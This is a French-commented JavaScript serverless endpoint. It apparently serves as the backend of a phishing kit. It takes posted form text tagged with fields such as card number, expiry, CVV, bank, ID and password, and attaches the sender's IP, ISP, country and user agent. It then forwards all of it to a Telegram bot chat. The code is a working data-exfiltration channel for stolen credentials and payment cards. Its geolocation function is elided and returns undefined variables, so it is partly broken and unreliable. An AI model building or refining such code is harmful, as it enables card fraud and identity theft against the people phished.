// api/notify.js

const TOKEN        = process.env.TELEGRAM_TOKEN;
const CHAT         = process.env.CHAT_ID;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';

export const config = {
  api: {
    bodyParser: false,  // on lit nous-mêmes le corps
  },
};

async function readBody(req) {
  const ct = req.headers['content-type'] || '';
  const buf = [];
  for await (const chunk of req) buf.push(chunk);
  const raw = Buffer.concat(buf).toString();
  if (ct.includes('application/json')) {
    try {
      return JSON.parse(raw).message || '';
    } catch {}
  }
  return raw;
}

async function geoLookup(ip) {
  // ... (3 appels inchangés à ipinfo/ipwho/ip-api) ...
  return { isp, countryCode, country };
}

function fullCountryName(codeOrName) {
  if (!codeOrName) return 'inconnue';
  if (codeOrName.length === 2) {
    try {
      return new Intl.DisplayNames(['fr'], { type: 'region' }).of(codeOrName);
    } catch {}
  }
  return codeOrName;
}

export default async function handler(req, res) {
  // CORS (pré-flight Safari)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST, OPTIONS');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // 1️⃣ Lecture du message
  const rawMsg = (await readBody(req)).trim();
  if (!rawMsg) return res.status(400).json({ error: 'Missing message' });

  // 2️⃣ IP + UA
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // 3️⃣ Geo Lookup
  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country || countryCode);

  // 4️⃣ Date & heure FR (année sur 2 chiffres)
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR',{ day:'2-digit', month:'2-digit', year:'2-digit' });
  const time = now.toLocaleTimeString('fr-FR',{ hour:'2-digit', minute:'2-digit', second:'2-digit' });

  // 5️⃣ Mapping icônes
  const iconMap = {
    'étape':               '📣',
    'nom':                 '👤',
    'prénom':              '🙋',
    'téléphone':           '📞',
    'email':               '✉️',
    'adresse':             '🏠',
    'carte':               '💳',
    'numéro':              '🔢',
    'exp':                 '📅',
    'expiration':          '📅',
    'cvv':                 '🔒',
    'banque':              '🏦',
    'id':                  '🆔',
    'pass':                '🔑',
    'password':            '🔑'
  };

  // 6️⃣ Construction du texte avec icônes détectées
  const lines = rawMsg
    .split('\n')
    .map(l => l.trim())
    .filter(l => l);
  let text = '';
  for (let line of lines) {
    const low = line.toLowerCase();
    let icon = '';
    for (let key in iconMap) {
      if (low.startsWith(key)) {
        icon = iconMap[key];
        break;
      }
    }
    text += icon ? `${icon} ${line}\n` : `${line}\n`;
  }

  // 7️⃣ Bloc infos additionnel
  text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
  text += `🌐 IP Client     : ${ip}\n`;
  text += `🔎 ISP Client    : ${isp}\n`;
  text += `🌍 Pays Client   : ${countryDisplay}\n`;
  text += `📍 User-Agent    : ${ua}\n`;
  text += `©️ ${now.getFullYear()} ©️`;

  // 8️⃣ Envoi plain-text sur Telegram
  await fetch(
    `https://api.telegram.org/bot${TOKEN}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text, disable_web_page_preview: true })
    }
  );

  return res.status(200).json({ ok: true });
}